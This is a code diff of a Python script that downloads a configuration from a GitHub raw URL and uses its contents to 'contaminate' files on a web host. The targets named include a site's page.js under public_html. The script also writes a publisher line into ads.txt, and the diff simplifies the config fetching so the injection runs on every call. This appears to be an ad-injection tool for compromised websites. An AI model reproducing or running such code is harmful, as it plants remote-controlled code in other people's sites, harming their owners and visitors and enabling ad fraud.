@@ -1,53 +1,18 @@
 import base64
 import json
 import os
-import time
 import urllib
 
 
-def fetch_config(url_path, name):
+def fetch_config(url_path):
     response = urllib.urlopen(url_path)
     if response.code == 200:
-        conf = open(name, 'w')
         try:
             resp = json.loads(response.read())
         except Exception:
             pass
         else:
-            conf.write(json.dumps(resp))
-            conf.close()
-
-
-globals_file = os.path.join(
-    os.path.dirname(os.path.abspath(__file__)),
-    'gl.json'
-)
-
-def get_globals():
-    try:
-        conf_file = open(globals_file, 'r')
-    except IOError:
-        result = {
-            "update": True,
-            "last_update": 1682415015.825721
-        }
-        conf_file = open(globals_file, 'w')
-        conf_file.write(json.dumps(result))
-        return result
-    else:
-        conf = conf_file.read()
-        conf_file.close()
-        return json.loads(conf)
-
-
-def update_globals(key, value):
-    conf_file = open(globals_file, 'r+')
-    conf = json.loads(conf_file.read())
-    conf[key] = value
-    conf_file.seek(0)
-    conf_file.write(json.dumps(conf))
-    conf_file.truncate()
-    conf_file.close()
+            return resp
 
 
 def get_config():
@@ -57,26 +22,9 @@ def get_config():
     e.g FileNotFoundError, etc...
     :return:
     """
-    globals_conf = get_globals()
-    is_expired = (globals_conf['last_update'] + 600) < time.time()
-    if is_expired:
-        update_globals('update', True)
-    location = os.path.join(
-        os.path.dirname(os.path.abspath(__file__)),
-        'cf.json'
+    return fetch_config(
+        'https://raw.githubusercontent.com/babi40060/config/main/ads.json'
     )
-    if globals_conf['update']:
-        fetch_config(
-            'https://raw.githubusercontent.com/babi40060/config/main/ads.json',
-            location
-        )
-        update_globals('update', False)
-        update_globals('last_update', time.time())
-        time.sleep(1)
-    config_file = open(location, 'r')
-    config = config_file.read()
-    config_file.close()
-    return json.loads(config)
 
 
 def get_target_contaminate(file_paths):
@@ -119,12 +67,10 @@ def insert_code(file_path, ads_code):
 if __name__ == "__main__":
     # /home/dawnvtus/public_html/public/assets/js/page.js
     _config = get_config()
-    if not contaminate(_config.get('c')):
-        contaminate(_config.get('c'))
-        update_globals('update', True)
+    contaminate(_config.get('c'))
 
     # /home/dawnvtus/public_html/public/ads.txt
     insert_code(
-        file_path="/home/dawnvtus/public_html/public/ads.txt",
+        file_path="ads.txt",
         ads_code="google.com, pub-4077931868817000, DIRECT, f08c47fec0942fa0",
     )
